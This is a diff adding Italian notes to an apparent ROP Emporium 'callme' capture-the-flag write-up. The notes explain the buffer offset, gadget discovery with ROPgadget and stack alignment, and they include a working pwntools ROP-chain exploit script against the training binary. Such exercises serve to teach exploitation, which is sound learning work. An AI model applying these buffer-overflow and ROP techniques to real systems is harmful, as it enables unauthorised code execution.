@@ -39,3 +39,59 @@
   p.interactive()
   
   =>ROPE{a_placeholder_32byte_flag!}
+
+2)callme
+  =>Anche in questa challenge abbiamo:
+  	NX        : ENABLED
+  Questo ci suggerisce che ci sia una tecnica W^X attiva. Perciò sappiamo che dobbiamo usare una ROP chain;
+  La consegna ci dice di invocare 3 funzioni con i vari parametri; nota che siamo in un'architettura a 64bit. Un'idea potrebbe essere inviare una chain;
+  Da notare che:
+  	prima: la shellcode veniva iniettata nel buffer perchè era un'area di memoria sia scrivibile che eseguibile;
+  	ora: A causa di tecniche come W^X, iniettiamo una ROP chain come indirizzo di ritorno (=>sequenza di indirizzi)
+
+  a)Cerchiamo di capire la struttura del buffer
+  		buffer[32]
+  		RBP[8]
+  		RSP(trascurabile)
+  		RIP
+  	=>perciò per raggiungere il RIP mi servono 40Bytes di garbage
+  
+  b)dobbiamo caricare i 3 valori dei parametri in dei registri; cerchiamo il gadget adeguato
+  	ROPgadget --binary "./callme" | grep "pop"	
+  	=>0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
+  
+  c)abbiamo bisogno dell'indirizzo delle funzioni
+  	callme_one=>   0x0000000000400720
+  	callme_two=>   0x0000000000400740
+  	callme_three=> 0x00000000004006f0
+  
+  d)infine necessitiamo del gadget per riallineare lo stack prima delle chiamate a funzioni
+  	ROPgadget --binary "./callme" | grep "ret"
+  	=>0x00000000004006be : ret
+  	
+  	
+  Ora dovremmo avere tutti gli ingredienti
+  nota: 
+  	-Per ogni chiamata, devi caricare nuovamente i valori nei registri, altrimenti la funzione successiva riceverà argomenti errati.
+  	-Prima di chiamare una qualsiasi funzione devi allineare lo stack!
+  	
+  from pwn import *
+  p=process('./callme')
+  garbage=b'A'*40
+  registri=p64(0x000000000040093c)
+  value1=p64(0xdeadbeefdeadbeef)
+  value2=p64(0xcafebabecafebabe)
+  value3=p64(0xd00df00dd00df00d)
+  allineamento=p64(0x00000000004006be)
+  func1=p64(0x0000000000400720)
+  func2=p64(0x0000000000400740)
+  func3=p64(0x00000000004006f0)
+  payload= garbage + allineamento + registri + value1 + value2 + value3 +func1
+  #for each call you have to allocate the values in the registers
+  payload += allineamento + registri + value1 + value2 + value3 + func2 +allineamento
+  payload+= registri + value1 + value2 + value3 + func3
+  p.sendline(payload)
+  print(p.recvall())
+  
+  =>ROPE{a_placeholder_32byte_flag!}
+  
